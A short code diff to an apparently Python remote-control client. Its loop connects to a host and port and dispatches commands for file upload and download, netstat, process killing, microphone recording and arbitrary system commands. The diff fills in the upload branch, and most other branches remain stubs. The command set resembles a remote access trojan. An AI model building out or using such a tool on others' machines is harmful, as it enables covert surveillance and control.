@@ -25,7 +25,7 @@ def run(host, port):
             elif command[:8] == "download":
                 pass
             elif command[:6] == "upload":
-                pass
+                upload(client_socket, command[7:])
             elif command == "netstat":
                 pass
             elif command[:4] == "kill":
@@ -44,7 +44,7 @@ def run(host, port):
                 pass
             elif command[:21] == "mic_record --duration":
                 pass
-            else: # * Run Other System Commands
+            else:  # * Run Other System Commands
                 pass
     except:
         return
